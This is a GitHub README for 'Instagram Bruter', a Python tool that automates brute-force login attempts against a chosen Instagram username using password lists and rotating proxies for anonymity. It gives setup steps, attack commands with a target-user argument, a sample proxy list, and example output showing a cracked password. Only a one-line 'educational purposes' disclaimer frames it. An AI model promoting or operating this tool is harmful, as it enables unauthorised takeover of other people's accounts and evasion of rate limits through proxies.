
# Instagram Bruter

  

## Description

Instagram Bruter is a password brute-force tool designed to test the security of Instagram accounts. It automates login attempts using a list of passwords and proxies.

## Getting Started  
**Star** this repository to show your support, hit **Fork**, and dive right in!


## Author


Original Authors:
- **Hackertrackersj**
- **OBITORASU**
- **TermuxHackz**

Modified/Updated Version By:
- [**Pralin Khaira**](https://github.com/pralinkhaira)

## Features

- Multi-threaded brute-force attack

- Proxy support for anonymity

- Session resume functionality

- Password list-based attack

- Proxy pruning and statistics tracking

  

## Requirements

- Python 3.9+

- Proxy list

  

## Install Dependencies

  

### Install Pipenv

  

```
pip install pipenv
```

  

### Create Environment

  

Make sure you have Python 3.9 installed

  

```
pipenv --python 3.9
```

  

### Install Requirements

  

```
pipenv install
```

  

## Usage

```sh
python  instagram.py  -u <username> -p <password_list.txt> -px <proxy_list.txt> -m <mode>
```

### Options:

-  `-u, --username` : Target Instagram username or email
jackiehyd3
-  `-p, --passlist` : Path to password list file

-  `-px, --proxylist` : Path to proxy list file

-  `-m, --mode` : Attack mode (0 to 3, where 0 = 32 bots, 3 = 4 bots)

-  `--prune` : Prune the proxy database (value between 0 and 1)

-  `--stats` : Show proxy statistics

-  `-nc, --no-color` : Disable color output

  

## Example

```sh
python  instagram.py  -u  target_user  -p  passwords.txt  -px  proxies.txt  -m  2
```

  

## Proxies

  

The system needs a list of proxies to work. Once uploaded, proxies are saved into a database.

  

### Upload Proxies

  

Upload a list of proxies into the program. The proxy file must have a format of `ip:port`

  

Example `proxies_list.txt`:

```
3.238.111.248:80
206.189.59.192:8118
165.22.81.30:34100
176.248.120.70:3128
191.242.178.209:3128
180.92.194.235:80
```

  

To upload a list of proxies, use:

```
python instagram.py -px <path to proxy list>
```

  

### Proxy Statistics

  

Gives an insight into the health of the proxies in the database.

```
python instagram.py --stats
```

  

### Prune Proxies

  

Removes proxies with a score below a given threshold. It is recommended to prune the database of proxies with a score below `Q1`.

```
python instagram.py --prune 0.05
```

  

## Running the Tool

  

### Start Attack

```

```

### Example Output (During Attack)

```
[-] Wordlist: passlist.txt
[-] Username: Sami09.1
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Example Output (Successful Attempt)

```

[-] Wordlist: passlist.txt
[-] Username: Sami09.1
[-] Password: Sami123
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123

```

  

## Disclaimer

This tool is for educational purposes only. Unauthorized use against accounts you do not own is illegal.
